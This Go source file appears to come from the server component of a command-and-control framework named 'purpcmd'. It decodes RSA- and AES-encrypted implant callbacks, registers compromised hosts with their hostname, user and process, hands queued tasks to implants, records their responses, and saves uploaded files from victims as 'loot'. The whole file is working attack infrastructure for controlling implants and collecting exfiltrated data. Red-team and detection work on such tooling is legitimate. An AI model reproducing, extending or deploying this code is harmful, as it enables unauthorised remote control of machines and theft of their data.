package callback

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net/http"
	impx "purpcmd/implant"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"purpcmd/server/implant"
	"purpcmd/server/log"
	"purpcmd/server/loot"
	"purpcmd/server/lua"
)

func ParseCallback(d []byte, req *http.Request, name string) (uint16, []byte) {
	var r io.Reader

	if name == "" {
		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
		n, _ := base64.StdEncoding.Decode(dataB64, d)

		aux := encrypt.EncryptImport([16]byte{}, [16]byte{})
		a, err := aux.RSADecode(dataB64[:n])
		if err != nil {
			return internal.NIL, []byte{}
		}

		r = bytes.NewReader(a)
	} else {
		imp := implant.ImplantPtrByName(name)
		if imp == nil {
			// error no session for given ID
			return internal.NIL, []byte{}
		}

		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(d)))
		n, _ := base64.StdEncoding.Decode(dataB64, d)

		if !imp.Enc.HMACVerifyHash(dataB64[:n]) {
			// error HMAC do not match
			return internal.NIL, []byte{}
		}

		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
		data, err := imp.Enc.AESCbcDecrypt(dataOrig)
		if err != nil {
			// error problem with enc
			panic(err)
		}

		r = bytes.NewReader(data)
	}

	var messageType uint16
	err := binary.Read(r, binary.BigEndian, &messageType)
	if err != nil {
		if err == io.EOF {
			return internal.NIL, []byte{}
		}
	}

	var task []byte
	switch messageType {
	case internal.REG:
		err = ParseAndReg(r, req)
	case internal.CHK:
		task, err = ParseCheck(r, req)
	case internal.RSP:
		err = ParseResponse(r, req)
	case internal.CHU:
		err = ParseChunkData(r, req)
		if err != nil {
			log.AsyncWriteStdoutAlert(err.Error())
		}
	default:
		messageType = internal.NIL
	}

	return messageType, task
}

func ParseMetadata(r io.Reader, i *impx.ImplantMetadata) {
	binary.Read(r, binary.BigEndian, &i.PID)
	binary.Read(r, binary.BigEndian, &i.SessionID)
	binary.Read(r, binary.BigEndian, &i.OTS)
	binary.Read(r, binary.BigEndian, &i.IP)
	binary.Read(r, binary.BigEndian, &i.Port)
	binary.Read(r, binary.BigEndian, &i.Sleep)
	binary.Read(r, binary.BigEndian, &i.Arch)
}

func ParseAndReg(r io.Reader, req *http.Request) error {
	i := new(impx.ImplantMetadata)
	ParseMetadata(r, i)

	var aedkey [16]byte
	var aesiv [16]byte
	binary.Read(r, binary.BigEndian, &aedkey)
	binary.Read(r, binary.BigEndian, &aesiv)

	var dataLen uint16
	binary.Read(r, binary.BigEndian, &dataLen)
	data := make([]byte, dataLen)
	binary.Read(r, binary.BigEndian, &data)

	dataS := bytes.Split(data, internal.SEP)
	if len(dataS) != 3 {
		return errors.New("data must have 3 entities and have")
	}
	i.Proc = string(dataS[0])
	i.Hostname = string(dataS[1])
	i.User = string(dataS[2])

	name := fmt.Sprintf("%d", i.SessionID)
	if implant.ImplantPtrByName(name) != nil {
		return errors.New("session/implant exists. can't register another with same name")
	}

	aesEnc := encrypt.EncryptImport(aedkey, aesiv)

	imp := implant.ImplantNew(name)
	imp.ImplantSetMetadata(i)
	imp.ImplantSetEncryption(aesEnc)
	imp.ImplantSetRemoteSocket(req.RemoteAddr)
	imp.ImplantAddImplant()

	lua.LuaOnRegister(*imp)
	return nil
}

// ParseCheck parse health check
func ParseCheck(r io.Reader, req *http.Request) ([]byte, error) {
	i := new(impx.ImplantMetadata)
	ParseMetadata(r, i)

	name := fmt.Sprintf("%d", i.SessionID)
	imp := implant.ImplantPtrByName(name)
	if imp == nil {
		return []byte{}, errors.New("no session with name")
	}
	imp.ImplantUpdateLastseen()

	data, tid, err := imp.ImplantGetTaskStr()
	if err != nil {
		return []byte{}, nil
	}
	lua.LuaOnCheck(tid, data, *i, imp.Name, imp.UUID)

	log.AsyncWriteStdoutInfo(fmt.Sprintf("Sending task %s of %d bytes to %s\n", string(tid[:]), len(data), imp.Name))
	return []byte(data), nil
}

func ParseResponse(r io.Reader, req *http.Request) error {
	i := new(impx.ImplantMetadata)
	ParseMetadata(r, i)

	name := fmt.Sprintf("%d", i.SessionID)
	imp := implant.ImplantPtrByName(name)
	if imp == nil {
		return errors.New("no session with name")
	}
	imp.ImplantUpdateLastseen()

	var TaskID [8]byte
	binary.Read(r, binary.BigEndian, &TaskID)

	TaskIDStr := TaskID
	taskPtr := implant.TaskGetPtrById(name, TaskIDStr)
	if taskPtr == nil {
		return errors.New("no task with given id")
	}

	var respLen uint32
	binary.Read(r, binary.BigEndian, &respLen)
	respPayload := make([]byte, respLen)
	binary.Read(r, binary.BigEndian, &respPayload)
	taskPtr.TaskSetResponsePayload(respPayload)

	lua.LuaOnResponse(TaskID, string(respPayload), imp.Metadata,imp.Name, imp.UUID)

	log.AsyncWriteStdoutInfo(fmt.Sprintf("Response - session:%s task:%s length:%d\n\n%s\n\n", name, TaskIDStr, respLen, respPayload))
	return nil
}

func ParseChunkData(r io.Reader, req *http.Request) error {
	i := new(impx.ImplantMetadata)
	ParseMetadata(r, i)
	name := fmt.Sprintf("%d", i.SessionID)
	imp := implant.ImplantPtrByName(name)
	if imp == nil {
		return errors.New("no session with name")
	}

	var TaskID [8]byte
	binary.Read(r, binary.BigEndian, &TaskID)

	var fileNameLen uint32
	binary.Read(r, binary.BigEndian, &fileNameLen)
	fileName := make([]byte, fileNameLen)
	binary.Read(r, binary.BigEndian, &fileName)

	var contentLen uint32
	binary.Read(r, binary.BigEndian, &contentLen)
	content := make([]byte, contentLen)
	binary.Read(r, binary.BigEndian, &content)

	err := loot.New(name, string(fileName), content).SaveData()
	if err != nil {
		return err
	}

	return nil
}